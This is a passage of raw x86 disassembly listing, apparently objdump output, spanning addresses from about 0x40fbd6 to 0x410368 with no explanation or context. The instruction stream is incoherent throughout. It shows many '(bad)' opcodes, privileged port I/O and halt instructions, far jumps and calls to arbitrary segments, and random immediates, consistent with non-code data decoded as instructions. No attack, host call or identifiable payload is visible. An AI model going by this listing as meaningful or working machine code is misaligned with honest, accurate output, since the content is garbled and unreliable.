  40fbd6:	sar    BYTE PTR [edx-0x32aeb7ca],0x4c
  40fbdd:	adc    al,BYTE PTR [ecx-0x311ccea]
  40fbe3:	mov    al,ds:0x39053ec5
  40fbe8:	sbb    al,0x8d
  40fbea:	xchg   esi,eax
  40fbeb:	in     eax,dx
  40fbec:	adc    esp,0x62894c89
  40fbf2:	add    ch,dl
  40fbf4:	sbb    BYTE PTR [eax],bl
  40fbf6:	xchg   edx,eax
  40fbf7:	sbb    edi,DWORD PTR [edx-0x4a]
  40fbfa:	jecxz  0x40fba4
  40fbfc:	or     DWORD PTR [eax-0x3db2b64],edx
  40fc02:	jo     0x40fc0d
  40fc04:	adc    ebx,edx
  40fc06:	mov    eax,0xd9dd9a7e
  40fc0b:	icebp  
  40fc0c:	push   es
  40fc0d:	and    eax,DWORD PTR ds:0x98ed57f9
  40fc13:	dec    esp
  40fc14:	test   DWORD PTR [edi+0x41d986ae],esp
  40fc1a:	or     esp,DWORD PTR [esi]
  40fc1c:	xchg   ecx,eax
  40fc1d:	jge    0x40fbe4
  40fc1f:	xchg   edi,eax
  40fc20:	dec    eax
  40fc21:	ins    BYTE PTR es:[edi],dx
  40fc22:	shl    DWORD PTR [ebx],1
  40fc24:	mov    ebp,0x94b2dea2
  40fc29:	test   al,0x55
  40fc2b:	hlt    
  40fc2c:	push   esi
  40fc2d:	es cs push edi
  40fc30:	sahf   
  40fc31:	dec    ebp
  40fc32:	(bad)  
  40fc33:	not    WORD PTR [edx+ebp*1+0xa]
  40fc38:	pop    esp
  40fc39:	js     0x40fc9b
  40fc3b:	mov    edi,0xd53a70dd
  40fc40:	inc    ebp
  40fc41:	scas   al,BYTE PTR es:[edi]
  40fc42:	aam    0x90
  40fc44:	jle    0x40fcbb
  40fc46:	mov    al,ds:0xf2632d85
  40fc4b:	in     al,0x66
  40fc4d:	enter  0xc01b,0xe0
  40fc51:	(bad)  
  40fc52:	call   0x1153:0x32b3b1f8
  40fc59:	imul   edx,ebx,0xf795dc26
  40fc5f:	je     0x40fcd4
  40fc61:	aad    0xf2
  40fc63:	push   0x7f
  40fc65:	imul   eax,edi,0x76
  40fc68:	loopne 0x40fcba
  40fc6a:	in     al,dx
  40fc6b:	dec    si
  40fc6d:	adc    eax,0xa427b716
  40fc72:	(bad)  
  40fc73:	mov    ah,0x29
  40fc75:	stos   BYTE PTR es:[edi],al
  40fc76:	mov    bh,0x99
  40fc78:	std    
  40fc79:	add    dh,BYTE PTR [ecx+edi*4-0x1523b089]
  40fc80:	cmc    
  40fc81:	pop    ds
  40fc82:	or     edx,DWORD PTR [ecx+0x49]
  40fc85:	mov    dl,0x58
  40fc87:	mov    ah,0x19
  40fc89:	dec    ebp
  40fc8a:	or     eax,0xc8d3fd29
  40fc8f:	popf   
  40fc90:	loopne 0x40fcd2
  40fc92:	lahf   
  40fc93:	jo     0x40fd00
  40fc95:	adc    edx,DWORD PTR [ebx+0x28]
  40fc98:	sbb    al,0xb3
  40fc9a:	(bad)  
  40fc9b:	(bad)  
  40fc9c:	(bad)  [eax+0x15]
  40fc9f:	adc    BYTE PTR [eax+esi*1],bh
  40fca2:	ins    BYTE PTR es:[edi],dx
  40fca3:	dec    edx
  40fca4:	daa    
  40fca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca6:	or     DWORD PTR [ecx],0x21f0974c
  40fcac:	or     esp,esp
  40fcae:	sbb    eax,0x631cf179
  40fcb3:	je     0x40fcdf
  40fcb5:	jl     0x40fcfa
  40fcb7:	jne    0x40fd36
  40fcb9:	jae    0x40fd05
  40fcbb:	sbb    BYTE PTR [ecx],dl
  40fcbd:	ficom  DWORD PTR [esi]
  40fcbf:	div    ch
  40fcc1:	inc    ebp
  40fcc2:	mov    ss:0xbb1533b2,eax
  40fcc8:	jae    0x40fca5
  40fcca:	pop    edi
  40fccb:	lods   eax,DWORD PTR ds:[esi]
  40fccc:	(bad)  
  40fccd:	xchg   esi,eax
  40fcce:	push   cs
  40fccf:	stos   DWORD PTR es:[edi],eax
  40fcd0:	mov    dh,0x38
  40fcd2:	hlt    
  40fcd3:	outs   dx,DWORD PTR ds:[esi]
  40fcd4:	push   eax
  40fcd5:	ficomp DWORD PTR [edx]
  40fcd7:	lock dec edi
  40fcd9:	clc    
  40fcda:	nop
  40fcdb:	icebp  
  40fcdc:	dec    edi
  40fcdd:	sub    dh,cl
  40fcdf:	jge    0x40fcd0
  40fce1:	in     eax,dx
  40fce2:	mov    ds:0x6b317e0a,eax
  40fce7:	push   0xba99cbeb
  40fcec:	dec    ecx
  40fced:	rcl    DWORD PTR [eax+edx*1-0x470bb7d0],cl
  40fcf4:	(bad)  
  40fcf6:	jmp    0x40fcc0
  40fcf8:	push   cs
  40fcf9:	ret    
  40fcfa:	enter  0xd95e,0xa8
  40fcfe:	cld    
  40fcff:	adc    DWORD PTR [ecx+0x67],ebp
  40fd02:	ja     0x40fcd1
  40fd04:	jmp    0xf26:0x9471d0a8
  40fd0b:	cmp    DWORD PTR [edx+eax*2-0x19ad94cb],ebx
  40fd12:	or     eax,0x7b0077a2
  40fd17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd18:	lock xchg edi,eax
  40fd1a:	push   eax
  40fd1b:	adc    DWORD PTR [ebx-0x78],eax
  40fd1e:	popa   
  40fd1f:	jge    0x40fcc3
  40fd21:	test   eax,0x69e3f027
  40fd26:	mov    ah,0xcb
  40fd28:	int    0x96
  40fd2a:	(bad)  
  40fd2b:	push   cs
  40fd2c:	sar    BYTE PTR [eax],0x26
  40fd2f:	push   ecx
  40fd30:	or     cl,BYTE PTR [edi+ebx*8]
  40fd33:	test   eax,0x42d1c5f8
  40fd38:	fcmovu st,st(6)
  40fd3a:	stos   BYTE PTR es:[edi],al
  40fd3b:	mov    ds:0x41f018e9,al
  40fd40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd41:	stos   BYTE PTR es:[edi],al
  40fd42:	in     al,0xa3
  40fd44:	jmp    0xe551883d
  40fd49:	or     al,0x50
  40fd4b:	adc    BYTE PTR [ecx-0xdfef6b7],ch
  40fd51:	or     ah,dh
  40fd53:	jns    0x40fcf1
  40fd55:	jns    0x40fdc9
  40fd57:	nop
  40fd58:	(bad)  
  40fd59:	adc    esi,DWORD PTR [edi+0x4b]
  40fd5c:	or     cl,dh
  40fd5e:	dec    ecx
  40fd5f:	dec    ebp
  40fd60:	fst    DWORD PTR [edx-0x6d]
  40fd63:	int    0xa2
  40fd65:	ds inc ebx
  40fd67:	add    al,0x99
  40fd69:	or     esp,eax
  40fd6b:	sub    DWORD PTR [edx-0x660ca280],0x76
  40fd72:	push   ebx
  40fd73:	add    al,0x5
  40fd75:	or     edi,edx
  40fd77:	jmp    0x4739e117
  40fd7c:	bound  edx,QWORD PTR [eax+0x5e]
  40fd7f:	mov    ebx,0xae7270bc
  40fd84:	ror    BYTE PTR [ebx],cl
  40fd86:	mov    ebp,0x5e33122b
  40fd8b:	sahf   
  40fd8c:	imul   edx,ebx,0x7cf28c89
  40fd92:	fldenv [ebx]
  40fd94:	jb     0x40fd50
  40fd96:	loopne 0x40fd19
  40fd98:	or     BYTE PTR [esi+0x37],al
  40fd9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd9c:	jns    0x40fd32
  40fd9e:	loop   0x40fd9c
  40fda0:	or     DWORD PTR [ebp-0x72],ebx
  40fda3:	sbb    ebx,DWORD PTR [ebp+0x10387788]
  40fda9:	xor    al,0x39
  40fdab:	(bad)  
  40fdac:	pop    eax
  40fdad:	pop    ebp
  40fdae:	loopne 0x40fdab
  40fdb0:	js     0x40fd7c
  40fdb2:	nop
  40fdb3:	daa    
  40fdb4:	rdtsc  
  40fdb6:	jnp    0x40fe2a
  40fdb8:	inc    esi
  40fdb9:	fs mov edx,0x181e971e
  40fdbf:	cld    
  40fdc0:	push   ss
  40fdc1:	or     al,BYTE PTR [eax+0x7fb275f0]
  40fdc7:	adc    sp,WORD PTR [edx-0x51]
  40fdcb:	xchg   edx,eax
  40fdcc:	sahf   
  40fdcd:	or     eax,0x913c1369
  40fdd2:	ss pop ss
  40fdd4:	out    0x95,al
  40fdd6:	inc    ebx
  40fdd7:	sbb    esi,DWORD PTR [eax+0x443565af]
  40fddd:	and    al,BYTE PTR [esi]
  40fddf:	jo     0x40fde4
  40fde1:	or     al,0xd1
  40fde3:	ins    DWORD PTR es:[edi],dx
  40fde4:	les    edi,FWORD PTR [eax+0x7eab4714]
  40fdea:	push   ebp
  40fdeb:	xlat   BYTE PTR ds:[ebx]
  40fdec:	ds mov es:0xc18b395,eax
  40fdf3:	cmp    eax,0x56098e94
  40fdf8:	push   esp
  40fdf9:	pop    ebp
  40fdfa:	test   BYTE PTR [ecx],cl
  40fdfc:	out    dx,eax
  40fdfd:	or     DWORD PTR [edx],ebx
  40fdff:	int    0x7a
  40fe01:	in     eax,dx
  40fe02:	mov    eax,0xd0aedd97
  40fe07:	pusha  
  40fe08:	loopne 0x40fe30
  40fe0a:	sbb    dl,BYTE PTR [edx]
  40fe0c:	jmp    0x40fdd5
  40fe0e:	aas    
  40fe0f:	xor    cl,BYTE PTR [ebp-0x9d5517]
  40fe15:	pusha  
  40fe16:	fild   WORD PTR [ecx]
  40fe18:	or     al,0x22
  40fe1a:	rol    DWORD PTR [esi-0x53d78903],cl
  40fe20:	cmp    eax,ebp
  40fe22:	add    BYTE PTR ds:0xa34e557a,dh
  40fe28:	dec    ebx
  40fe29:	lahf   
  40fe2a:	mov    cl,0x81
  40fe2c:	es loop 0x40fdaf
  40fe2f:	jae    0x40fdff
  40fe31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe32:	sub    esp,DWORD PTR [edx+0x2b]
  40fe35:	pop    es
  40fe36:	pop    ss
  40fe37:	sar    BYTE PTR [eax+0x294306c0],1
  40fe3d:	push   0x91ec7821
  40fe42:	jno    0x40fe50
  40fe44:	xchg   BYTE PTR [ebx],bh
  40fe46:	jp     0x40fdfb
  40fe48:	pop    es
  40fe49:	pop    esp
  40fe4a:	ds adc bl,bh
  40fe4d:	jbe    0x40fe6f
  40fe4f:	je     0x40fec7
  40fe51:	cmp    al,0xc0
  40fe53:	dec    ebx
  40fe54:	mov    WORD PTR [edx-0x29],cs
  40fe57:	addr16 sub al,0x13
  40fe5a:	loop   0x40feac
  40fe5c:	xor    BYTE PTR [ebx+0x39367435],0xd6
  40fe63:	sub    ch,BYTE PTR [esi+0x8]
  40fe66:	je     0x40fee2
  40fe68:	ins    BYTE PTR es:[edi],dx
  40fe69:	lods   al,BYTE PTR ds:[esi]
  40fe6a:	cdq    
  40fe6b:	fwait
  40fe6c:	in     eax,dx
  40fe6d:	ins    DWORD PTR es:[edi],dx
  40fe6e:	retf   
  40fe6f:	sti    
  40fe70:	loope  0x40feb1
  40fe72:	xor    BYTE PTR [edx+0xd6ccc83],ch
  40fe78:	mov    ebp,0xbcc9ed33
  40fe7d:	pop    esp
  40fe7e:	(bad)  
  40fe7f:	ins    BYTE PTR es:[edi],dx
  40fe80:	mov    ecx,0x67f6415c
  40fe85:	(bad)  [ecx]
  40fe87:	jo     0x40fe18
  40fe89:	add    eax,0x8202a288
  40fe8e:	and    DWORD PTR [eax+ebp*4+0x7d1660a2],ebx
  40fe95:	ds jbe 0x40fe5a
  40fe98:	(bad)  
  40fe99:	mov    ch,0x50
  40fe9b:	leave  
  40fe9c:	data16 mov ds:0xc092de1,al
  40fea2:	cs pop ebx
  40fea4:	or     BYTE PTR [edx],dh
  40fea6:	enter  0xc80a,0x93
  40feaa:	pusha  
  40feab:	jmp    0x1c09af7e
  40feb0:	sbb    al,0x86
  40feb2:	inc    ebp
  40feb3:	inc    eax
  40feb4:	fwait
  40feb5:	xor    al,0xbe
  40feb7:	nop
  40feb8:	test   eax,0x843c1bac
  40febd:	mov    al,0xca
  40febf:	out    dx,al
  40fec0:	push   ecx
  40fec1:	or     BYTE PTR [eax-0x257c4e62],0x64
  40fec8:	mov    cl,cl
  40feca:	inc    edi
  40fecb:	xor    bl,BYTE PTR [edx]
  40fecd:	inc    eax
  40fece:	mov    ah,0xeb
  40fed0:	pop    eax
  40fed1:	xor    eax,DWORD PTR ds:0x9042380d
  40fed7:	stos   BYTE PTR es:[edi],al
  40fed8:	test   BYTE PTR [ecx-0x7a],cl
  40fedb:	jge    0x40fe85
  40fedd:	fild   DWORD PTR [ecx-0x1b]
  40fee0:	add    BYTE PTR ds:0x5d6c6206,0x53
  40fee7:	jns    0x40feef
  40fee9:	enter  0xc822,0xab
  40feed:	and    dl,BYTE PTR [ecx+eiz*4]
  40fef0:	imul   esp,DWORD PTR [edx-0x33f261ac],0xffffffef
  40fef7:	scas   ax,WORD PTR es:[edi]
  40fef9:	jge    0x40ff66
  40fefb:	mov    bh,0xe6
  40fefd:	leave  
  40fefe:	ret    
  40feff:	je     0x40fedf
  40ff01:	inc    edx
  40ff02:	jl     0x40fe8b
  40ff04:	cmp    BYTE PTR [ecx+eax*2],ah
  40ff07:	mov    ds:0x6b780c58,al
  40ff0c:	push   cs
  40ff0d:	mov    ebp,ebp
  40ff0f:	and    esp,DWORD PTR [ebx-0x2ccaf43c]
  40ff15:	fcom   st(7)
  40ff17:	dec    edi
  40ff18:	(bad)  
  40ff1a:	repnz mov esi,0xfe9f5fa
  40ff20:	push   0x2c94905f
  40ff25:	int    0x5
  40ff27:	ret    
  40ff28:	mov    ch,0xab
  40ff2a:	sub    bl,bl
  40ff2c:	retf   
  40ff2d:	out    0xa4,eax
  40ff2f:	iret   
  40ff30:	pop    esi
  40ff31:	and    ch,BYTE PTR [esi-0x65]
  40ff34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff35:	or     ch,BYTE PTR [ebx]
  40ff37:	int    0x6b
  40ff39:	vandnpd xmm7,xmm2,XMMWORD PTR [ebp-0x38]
  40ff3e:	stos   DWORD PTR es:[edi],eax
  40ff3f:	jle    0x40ff63
  40ff41:	pop    edi
  40ff42:	in     eax,dx
  40ff43:	ins    BYTE PTR es:[edi],dx
  40ff44:	mov    cl,0xdc
  40ff46:	mov    al,ds:0xc79d837
  40ff4b:	outs   dx,BYTE PTR ds:[esi]
  40ff4c:	push   eax
  40ff4d:	cmc    
  40ff4e:	mov    ch,0x20
  40ff50:	into   
  40ff51:	lds    esp,FWORD PTR [ebp-0x38756683]
  40ff57:	mov    ?,WORD PTR [ebx-0x4e2c6727]
  40ff5d:	int    0xd0
  40ff5f:	jmp    0x24ff282
  40ff64:	js     0x40ff0a
  40ff66:	jp     0x40ff76
  40ff68:	pop    eax
  40ff69:	or     cl,dl
  40ff6b:	js     0x40ff09
  40ff6d:	pop    ds
  40ff6e:	stos   BYTE PTR es:[edi],al
  40ff6f:	and    ch,ah
  40ff71:	mov    ds,WORD PTR [edx-0x6b0bfefc]
  40ff77:	sub    ebp,edx
  40ff79:	sbb    eax,0xbe51dcf9
  40ff7e:	sub    bl,BYTE PTR [ecx-0x4c]
  40ff81:	cmc    
  40ff82:	aaa    
  40ff83:	nop
  40ff84:	cmp    BYTE PTR [ecx],ah
  40ff86:	enter  0xf5e6,0xfd
  40ff8a:	sub    ah,BYTE PTR [eax+0x60]
  40ff8d:	aas    
  40ff8e:	in     eax,dx
  40ff8f:	ret    
  40ff90:	add    dl,BYTE PTR [esi+ebp*4+0x2c912dcb]
  40ff97:	xchg   edx,eax
  40ff98:	push   edi
  40ff99:	and    BYTE PTR [ebx+edi*8+0x61],bh
  40ff9d:	aad    0xba
  40ff9f:	mov    WORD PTR [ecx-0x477cd93a],es
  40ffa5:	push   eax
  40ffa6:	push   ebx
  40ffa7:	sbb    DWORD PTR [ebx],esp
  40ffa9:	mov    bl,dh
  40ffab:	push   edi
  40ffac:	mov    ds:0x280ee6ed,eax
  40ffb1:	(bad)  
  40ffb2:	(bad)  
  40ffb3:	repz cmp eax,0x5bf8d7d2
  40ffb9:	ss sub esi,edi
  40ffbc:	ror    BYTE PTR [ebx+eax*2-0x11b6f109],cl
  40ffc3:	pop    esi
  40ffc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc5:	mov    gs,WORD PTR [edi+esi*4-0x4a47c244]
  40ffcc:	push   esi
  40ffcd:	jne    0x410006
  40ffcf:	adc    bl,cl
  40ffd1:	fst    DWORD PTR [eax]
  40ffd3:	lahf   
  40ffd4:	jecxz  0x410005
  40ffd6:	jecxz  0x40ff72
  40ffd8:	mov    dl,0xb9
  40ffda:	mov    eax,0x41bfe4ea
  40ffdf:	mov    edx,DWORD PTR [esp+esi*1-0x24c54db2]
  40ffe6:	xchg   ebx,eax
  40ffe7:	adc    eax,0xd722816f
  40ffec:	pop    ds
  40ffed:	adc    esi,ebp
  40ffef:	lds    ecx,FWORD PTR ss:[ebx]
  40fff2:	push   eax
  40fff3:	and    eax,0xa240fc24
  40fff8:	jmp    0x98d6:0xc4c7273b
  40ffff:	adc    DWORD PTR [ebp-0x1d],esp
  410002:	and    DWORD PTR [eax+0x1d328ca0],ebx
  410008:	out    0xfd,eax
  41000a:	int3   
  41000b:	gs push 0x6d9be9e4
  410011:	je     0x410021
  410013:	sbb    edx,DWORD PTR [ecx-0x783c6364]
  410019:	dec    esi
  41001a:	adc    esp,0xffffffde
  41001d:	dec    edx
  41001e:	adc    bh,BYTE PTR [esi]
  410020:	cmovg  esp,DWORD PTR [ecx-0x4dc68ceb]
  410027:	das    
  410028:	jne    0x410072
  41002a:	mov    ah,0xa3
  41002c:	mov    al,BYTE PTR [esi+0x625d595e]
  410032:	stc    
  410033:	loope  0x410044
  410035:	xor    bl,BYTE PTR [edi+0x7f]
  410038:	cmp    edi,DWORD PTR [ecx-0x58]
  41003b:	cmp    DWORD PTR [esi-0x3a5afc4c],edx
  410041:	enter  0x3618,0x81
  410045:	into   
  410046:	outs   dx,DWORD PTR ds:[esi]
  410047:	mov    ecx,edx
  410049:	and    eax,0x6343b5dc
  41004e:	stos   DWORD PTR es:[edi],eax
  41004f:	jmp    0x410061
  410051:	dec    ecx
  410052:	mov    ebx,DWORD PTR [edi+0x41]
  410055:	jae    0x40fffe
  410057:	ins    BYTE PTR es:[edi],dx
  410058:	sub    esp,edi
  41005a:	lods   al,BYTE PTR ds:[esi]
  41005b:	xchg   ebx,eax
  41005c:	cmp    dl,BYTE PTR [eax-0x7c]
  41005f:	jecxz  0x41009f
  410061:	iret   
  410062:	cmc    
  410063:	push   0xffffffdd
  410065:	test   bl,ch
  410067:	sbb    ah,BYTE PTR [edx-0x5]
  41006a:	movd   mm0,DWORD PTR [ecx+ebx*1-0x19]
  41006f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410070:	int    0x9
  410072:	stos   BYTE PTR es:[edi],al
  410073:	mov    ds,WORD PTR [edi+0x7d4281c]
  410079:	into   
  41007a:	out    dx,eax
  41007b:	cmp    BYTE PTR [edi],cl
  41007d:	jp     0x41006e
  41007f:	pop    ss
  410080:	pop    ecx
  410081:	fwait
  410082:	les    ebx,FWORD PTR [edx-0x6d]
  410085:	and    eax,0x1c51f68c
  41008a:	inc    ebp
  41008b:	arpl   si,bx
  41008d:	or     eax,0xcbac7b97
  410092:	popf   
  410093:	ret    0x456e
  410096:	(bad)
  410099:	dec    ecx
  41009a:	call   0x727a73eb
  41009f:	jl     0x410029
  4100a1:	mov    bl,0xf3
  4100a3:	sub    eax,0xf5f5932c
  4100a8:	xor    ebp,ebp
  4100aa:	dec    ebx
  4100ab:	test   eax,0x682b7551
  4100b0:	rcl    DWORD PTR [ecx],cl
  4100b2:	sahf   
  4100b3:	mov    bh,0xe5
  4100b5:	into   
  4100b6:	push   cs
  4100b7:	adc    al,dh
  4100b9:	jmp    0x186d:0x978e5c2e
  4100c0:	adc    eax,0x1cb5e05a
  4100c5:	jnp    0x410059
  4100c7:	xlat   BYTE PTR gs:[ebx]
  4100c9:	sbb    al,BYTE PTR [eax+0x44fdbe3b]
  4100cf:	(bad)  
  4100d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100d1:	adc    DWORD PTR [esi-0x69],0x22
  4100d5:	(bad)  
  4100d6:	call   DWORD PTR [eax-0x10]
  4100d9:	pop    edx
  4100da:	adc    edi,ebx
  4100dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100dd:	mov    ebp,0xad4a919e
  4100e2:	ret    
  4100e3:	mov    WORD PTR ds:0x588e51f8,?
  4100e9:	jo     0x41014a
  4100eb:	les    esi,FWORD PTR ds:0xb81f71d5
  4100f1:	jp     0x410105
  4100f3:	xor    BYTE PTR [edx+0x47],bl
  4100f6:	leave  
  4100f7:	ss sbb eax,0x1f628bca
  4100fd:	sbb    eax,0x3d230491
  410102:	cmp    dh,cl
  410104:	ja     0x41014d
  410106:	nop
  410107:	into   
  410108:	sti    
  410109:	cwde   
  41010a:	inc    ecx
  41010b:	xor    BYTE PTR [ecx+0x27eb510c],cl
  410111:	mov    esi,0x3e2a2f4c
  410116:	pop    ebx
  410117:	sbb    bl,ch
  410119:	mov    eax,0x3bb1c6ac
  41011e:	div    BYTE PTR [ecx]
  410120:	mov    edx,DWORD PTR [edi]
  410122:	inc    edx
  410123:	or     DWORD PTR ds:0xcca368e4,ebx
  410129:	fstp   QWORD PTR [edi-0x5404c64c]
  41012f:	add    BYTE PTR [esi],bl
  410131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410132:	add    al,0x41
  410134:	and    dl,BYTE PTR [ebp-0x44]
  410137:	lods   eax,DWORD PTR ds:[esi]
  410138:	xchg   edi,eax
  410139:	mov    ebp,0x8793282b
  41013e:	sbb    DWORD PTR [eax-0x4db66420],esp
  410144:	adc    ebx,ebp
  410146:	push   esp
  410147:	loope  0x4100de
  410149:	aam    0xd1
  41014b:	lock inc edi
  41014d:	push   edx
  41014e:	xchg   ebx,eax
  41014f:	ds (bad) 
  410151:	adc    ch,BYTE PTR [edx-0x23]
  410154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410155:	in     eax,0xd
  410157:	pop    ss
  410158:	pop    ds
  410159:	sub    al,0xa0
  41015b:	and    edx,DWORD PTR [edx+0x18]
  41015e:	and    eax,0xdc1bf85
  410163:	pop    ds
  410164:	leave  
  410165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410166:	sahf   
  410167:	push   0xfffffff2
  410169:	mov    ecx,0xd79c9f75
  41016e:	or     eax,0x707e489e
  410173:	push   0x522ff083
  410178:	and    eax,0xc11ad7e2
  41017d:	push   cs
  41017e:	cmp    BYTE PTR [ebx+0x636a5344],dh
  410184:	jle    0x41019f
  410186:	xor    eax,0xe4187dbf
  41018b:	cwde   
  41018c:	das    
  41018d:	pushf  
  41018e:	cmp    eax,0xffffffa9
  410191:	nop
  410192:	cmp    bh,BYTE PTR [edx]
  410194:	xor    bl,ah
  410196:	dec    ecx
  410197:	xlat   BYTE PTR ds:[ebx]
  410198:	fisttp QWORD PTR [edx-0x67946e43]
  41019e:	inc    ecx
  41019f:	pusha  
  4101a0:	cmp    al,0xeb
  4101a2:	or     BYTE PTR [edi],0x9e
  4101a5:	iret   
  4101a6:	push   eax
  4101a7:	das    
  4101a8:	add    BYTE PTR [esi+0x2],0x66
  4101ac:	inc    ebx
  4101ad:	cdq    
  4101ae:	(bad)  
  4101af:	icebp  
  4101b0:	mov    ecx,DWORD PTR [eax+0x32d6119a]
  4101b6:	(bad)  
  4101b7:	arpl   WORD PTR [edi+0x25c205f2],bx
  4101bd:	sahf   
  4101be:	sahf   
  4101bf:	mov    eax,ds:0x1a9d0514
  4101c4:	arpl   WORD PTR [ecx],si
  4101c6:	daa    
  4101c7:	iret   
  4101c8:	adc    DWORD PTR [edi+0x5e6b9598],0xffffffe4
  4101cf:	jmp    0x48e38b6a
  4101d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101d5:	xor    eax,0xe9859ac3
  4101da:	out    0x7f,eax
  4101dc:	dec    esp
  4101dd:	pop    ebp
  4101de:	ss scas eax,DWORD PTR es:[edi]
  4101e0:	call   0x5c92:0x721747ef
  4101e7:	mov    dh,0xc
  4101e9:	scas   eax,DWORD PTR es:[edi]
  4101ea:	stos   BYTE PTR es:[edi],al
  4101eb:	xor    dh,BYTE PTR [edx]
  4101ed:	cmp    DWORD PTR [ebx+0x7d],0xd81b80f1
  4101f4:	sub    ecx,DWORD PTR [esi]
  4101f6:	ror    ch,1
  4101f8:	mov    cl,0x61
  4101fa:	cmp    eax,0xe7e609b8
  4101ff:	cmp    al,0xfb
  410201:	xor    edx,DWORD PTR [ebx-0x22]
  410204:	mov    cl,BYTE PTR [esi-0x41b414d5]
  41020a:	ficom  WORD PTR [edx+ebp*8+0x4a]
  41020e:	shr    ecx,cl
  410210:	jo     0x41028c
  410212:	test   BYTE PTR [esi-0xdcff25],ah
  410218:	stos   DWORD PTR es:[edi],eax
  410219:	mov    ah,0xe0
  41021b:	push   cs
  41021c:	call   FWORD PTR [edi-0x71]
  41021f:	and    WORD PTR fs:[esi],dx
  410223:	loop   0x410271
  410225:	lea    esi,ds:0x8f9464df
  41022b:	scas   eax,DWORD PTR es:[edi]
  41022c:	ins    BYTE PTR es:[edi],dx
  41022d:	lock pop ebp
  41022f:	gs xor dh,ah
  410232:	cmp    bl,BYTE PTR [edi+0x3e]
  410235:	cmp    edi,esi
  410237:	inc    esp
  410238:	sbb    cl,al
  41023a:	test   eax,0x30a9341e
  41023f:	xor    bl,BYTE PTR [ebp+edx*8-0x54]
  410243:	retf   0xf68c
  410246:	push   ebp
  410247:	gs xor eax,0x849d32d0
  41024d:	in     al,dx
  41024e:	jp     0x4101fc
  410250:	add    DWORD PTR [ebx-0x7f],ecx
  410253:	inc    BYTE PTR [edx+ebp*8+0x3f]
  410257:	ror    esp,cl
  410259:	lea    esp,[eax]
  41025b:	and    dl,BYTE PTR [edi]
  41025d:	push   ebx
  41025e:	sbb    DWORD PTR [ebx-0x2dd617e9],0xe1aac2b3
  410268:	neg    BYTE PTR [esi-0x7f0a6cf5]
  41026e:	enter  0xf94,0x70
  410272:	out    0x59,eax
  410274:	mov    esi,0x4007146f
  410279:	out    dx,al
  41027a:	pop    es
  41027b:	or     cl,BYTE PTR [ebx-0x18484354]
  410281:	mov    esi,0x82b8884
  410286:	imul   DWORD PTR [ebx+0x4d]
  410289:	mov    DWORD PTR [edx-0x774613e3],esp
  41028f:	mov    dh,BYTE PTR [edi]
  410291:	push   ecx
  410292:	outs   dx,BYTE PTR ds:[esi]
  410293:	test   DWORD PTR [edx],ebp
  410295:	push   edi
  410296:	stc    
  410297:	mov    ds:0x18364129,al
  41029c:	stos   BYTE PTR es:[edi],al
  41029d:	pushf  
  41029e:	nop
  41029f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102a0:	adc    BYTE PTR [esp+ebp*4-0x432ca12e],0xf2
  4102a8:	xor    ecx,esp
  4102aa:	bndstx [edi],(bad)
  4102ad:	mov    bl,0x11
  4102af:	or     bh,dh
  4102b1:	push   ss
  4102b2:	sub    eax,0x411bf884
  4102b7:	jl     0x4102cc
  4102b9:	jp     0x41024f
  4102bb:	add    eax,0x9cce9617
  4102c0:	sub    DWORD PTR [edi],edi
  4102c2:	mov    eax,0xf0264a68
  4102c7:	mul    BYTE PTR [esi+0x5233044d]
  4102cd:	or     DWORD PTR [edi-0x37],ebp
  4102d0:	imul   BYTE PTR [ecx+0x2e]
  4102d3:	adc    al,BYTE PTR [ebx-0x4252356a]
  4102d9:	pop    ecx
  4102da:	clc    
  4102db:	pop    DWORD PTR [ecx+0x2]
  4102de:	mov    eax,ds:0x30677f54
  4102e3:	and    BYTE PTR [ebp+0x4f086d0c],0x67
  4102ea:	mov    ds:0x631bc1a5,eax
  4102ef:	add    ecx,esp
  4102f1:	stos   BYTE PTR es:[edi],al
  4102f2:	sub    ecx,ebp
  4102f4:	addr16 std 
  4102f6:	mov    ch,0x11
  4102f8:	sbb    ah,BYTE PTR [edx-0x2f]
  4102fb:	stos   BYTE PTR es:[edi],al
  4102fc:	jne    0x410360
  4102fe:	dec    esi
  4102ff:	out    dx,eax
  410300:	fs push ebx
  410302:	pop    esp
  410303:	pop    esi
  410304:	sbb    BYTE PTR [edi],al
  410306:	dec    ecx
  410307:	mov    cs,esp
  410309:	pop    eax
  41030a:	xor    ebp,esi
  41030c:	or     dh,BYTE PTR [eax-0x3d]
  41030f:	popa   
  410310:	(bad)  [edi]
  410312:	cmc    
  410313:	ins    DWORD PTR es:[edi],dx
  410314:	push   edi
  410315:	test   al,0x49
  410317:	nop
  410318:	and    al,BYTE PTR [esi+edi*4]
  41031b:	adc    ch,dh
  41031d:	mov    al,ds:0xc1308666
  410322:	arpl   WORD PTR [esi+0x7a],dx
  410325:	stc    
  410326:	sub    DWORD PTR [esi],ecx
  410328:	or     bh,dl
  41032a:	sbb    DWORD PTR [edi-0x72],edx
  41032d:	add    esp,eax
  41032f:	ror    DWORD PTR [edx-0x41aa3be],0xcd
  410336:	cmp    DWORD PTR [eax+0x345bbfb2],eax
  41033c:	cmp    DWORD PTR [ecx-0x170c3f27],ebp
  410342:	out    0xd0,al
  410344:	repz rol ebx,1
  410347:	xchg   BYTE PTR [ecx+0x4614c1f2],ch
  41034d:	jecxz  0x41031f
  41034f:	call   0x1363:0x438f5476
  410356:	push   eax
  410357:	stc    
  410358:	ret    
  410359:	das    
  41035a:	xchg   al,dh
  41035c:	add    eax,edi
  41035e:	and    ecx,DWORD PTR [edi]
  410360:	inc    edi
  410361:	js     0x41038e
  410363:	mov    WORD PTR [eax-0x3b],fs
  410366:	int    0x7c
  410368:	rol    BYTE PTR [esi-0x9],1
